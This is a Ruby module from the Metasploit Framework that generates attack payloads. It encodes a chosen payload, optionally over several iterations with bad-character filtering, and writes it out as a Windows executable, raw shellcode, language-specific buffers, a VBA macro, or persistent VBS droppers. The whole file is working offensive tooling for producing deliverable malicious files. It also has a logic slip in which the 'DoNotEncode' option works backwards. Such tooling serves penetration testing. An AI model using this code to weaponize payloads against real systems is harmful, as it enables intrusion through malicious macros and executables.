##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT
        
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Payload creation within Metasploit',
			'Description'    => %q{
					This module incorporates the features of msfpayload and msfencode to the console and web applications.
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['sussurro'],
			'Version'        => '$$',
                        'References'     =>  [ ],
                        'Payload'        =>
                                {
                                        'Space'       => 100000,
                                        'BadChars'    => '',
                                        'DisableNops' => true,
                                },
                        'Platform'       => [ 'win', 'linux', 'solaris', 'unix',
 'osx', 'bsd' ],
                        'Arch'           => ARCH_ALL,
                        'Targets'        => [ 
						[ 'Executable', { 'format' => 'executable' } ] ,
						[ 'Raw', { 'format' => 'raw' } ] ,
						[ 'Perl', { 'format' => 'perl' } ] ,
						[ 'Ruby', { 'format' => 'ruby' } ] ,
						[ 'C', { 'format' => 'c' } ] ,
						[ 'Java', { 'format' => 'java' } ] ,
						[ 'VBA', { 'format' => 'vba' } ] ,
						[ 'VBS', { 'format' => 'vbs' } ] ,
						[ 'Loop-VBS', { 'format' => 'loop-vbs' } ] ,
					    ],
			'DefaultTarget'  => 0))
		register_options(
			[
				OptInt.new("MaxSize", [false, "The Maximum size the for the encoded payload", 100000]),
				OptString.new("BadChars", [false, "Bad Characters for encoding", nil])
			]
		)
		register_advanced_options(
                       	[
			OptInt.new("EncoderIterations", [ false, "Number of times for the encoder to run",1]),
			OptBool.new("DoNotEncode", [ false, "Do not encode the payload",false]),
			OptPath.new("AltEXEPath", [false, "Alternate Executable Template Path", nil])
			]
		)

	end

	def exploit

		format = target.opts['format']
		arch = payload.arch
		plat = payload.platform.platforms
		encoder = payload.encoder
		eitr = datastore['EncoderIterations']
		encode = datastore['DoNotEncode']
		altexe = datastore['AltEXEPath']

		# If we need to encode this or there are bad characters listed
		# setup a new encoded buffer, otherwise use the already encoded
		# payload
		if(encode && datastore['BadChars'])
			badchars = Rex::Text.hex_to_raw(datastore['BadChars'])
			buf = encoder.encode(payload.raw,badchars)
		elsif (encode)
			buf = payload.encoded
		else
			buf = payload.raw
		end

		# Encode loop for multiple encoder iterations
		if(encode &&  eitr > 1)
			1.upto(eitr - 1) do |iter|
				print_status("Encoding iteration #{iter}")
				out = encoder.encode(buf,badchars)
				if(datastore['MaxSize'] && out.length > datastore['MaxSize'])
					print_status("Encoded size too large")	
					break
				else	
					buf = out
				end
			end
		end
				
		case format
			when 'ruby'
				buf = Rex::Text.to_ruby(buf)
				file_create(buf)
                        when 'perl'
				buf = Rex::Text.to_perl(buf)
				file_create(buf)
                        when 'c'
				buf = Rex::Text.to_c(buf)
				file_create(buf)
                        when 'java'
				buf = Rex::Text.to_java(buf)
				file_create(buf)
			when 'executable'
				exe  = Msf::Util::EXE.to_executable(
					payload.framework, arch, plat, buf,{ :template => altexe})
				file_create(exe)
			when 'vba'
				exe  = Msf::Util::EXE.to_executable(
					payload.framework, arch, plat, buf,{ :template => altexe})
					vba = Msf::Util::EXE.to_exe_vba(exe)
				file_create(vba)
			when 'vbs'
				if(arch.index(ARCH_X86))
					exe = Msf::Util::EXE.to_win32pe_vbs(
						payload.framework, buf, {:persist => true , :template => altexe})
					file_create(exe)
				else
					print_status("Invalid Architecture")
					return
				end
			when 'loop-vbs'
				if(arch.index(ARCH_X86))
					exe = Msf::Util::EXE.to_win32pe_vbs(
						payload.framework, buf, {:persist => true , :template => altexe})

					file_create(exe)
				else
					print_status("Invalid Architecture")
					return
				end
			else
				if(buf.length > datastore['MaxSize'])
					print_status("Filesize is too big, aborting")
				else
					file_create(buf)
				end
		end
		
	end

end
